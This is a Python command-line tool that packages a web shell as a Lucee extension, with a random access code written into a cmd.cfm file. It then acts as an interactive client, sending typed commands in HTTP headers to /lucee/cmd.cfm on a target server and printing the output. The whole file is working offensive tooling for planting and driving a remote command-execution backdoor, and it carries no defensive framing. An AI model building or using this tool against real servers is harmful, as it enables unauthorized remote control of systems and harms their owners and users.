import click
import os
import random
import requests
import string
import subprocess
import sys
from zipfile import ZipFile, ZIP_DEFLATED

def generate_random_string(length=25):
    """Generate a random string of fixed length."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def get_existing_auth_code(file_path):
    """Extract and return the existing auth code from the file, if it exists."""
    with open(file_path, 'r', encoding='utf-8') as file:
        content = file.read()
    start = content.find('secretCode = "') + 14
    end = content.find('"', start)
    return content[start:end]

def replace_secret_code_in_file(file_path, new_code):
    """Replace the SECRET_CODE in the given file with new_code."""
    with open(file_path, 'r', encoding='utf-8') as file:
        content = file.read()
    if "SECRET_CODE" in content:
        content = content.replace("SECRET_CODE", new_code)
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(content)
        click.echo(f"Generating auth code: {new_code}")
    else:
        existing_code = get_existing_auth_code(file_path)
        click.echo(f"Auth_code already set: {existing_code}")

def create_lex_package(directory_path, output_directory, package_name="package.lex"):
    package_path = os.path.join(output_directory, package_name)
    if os.path.exists(package_path):
        click.echo("LEX package "+package_path+" already created. Exiting.")
        sys.exit()

    click.echo("Generating LEX package...")

    with ZipFile(package_path, 'w', ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, start=directory_path))

    click.echo(f"{package_path} created.")  

@click.group()
def cli():
    pass

@cli.command()
def build():
    """Build the LEX package."""
    secret_code = generate_random_string()
    cmd_file_path = "webshell/lex-package/context/cmd.cfm"
    lex_package_directory = "webshell/lex-package/"
    output_directory = "webshell/"
    replace_secret_code_in_file(cmd_file_path, secret_code)
    create_lex_package(lex_package_directory, output_directory)

@cli.command()
@click.option('--url', required=True, help='The URL to send commands to.')
@click.option('--auth-code', required=True, help='The auth code for command execution.')
def cmd(url, auth_code):
    """Execute commands through HTTP requests."""
    execute_command(f"{url}/lucee/cmd.cfm", auth_code)

def execute_command(url, auth_code):
    """Execute commands through HTTP requests and print the result."""
    while True:
        cmd = click.prompt("Enter command", default='exit', show_default=False)
        if cmd.lower() == 'exit':
            break
        headers = {"X-Auth-Code": auth_code, "X-Command": cmd}
        response = requests.get(url, headers=headers)
        if "Result:" in response.text:
            click.echo(response.text.split("Result:")[-1])
        else:
            click.echo("Error occurred")

if __name__ == "__main__":
    cli()

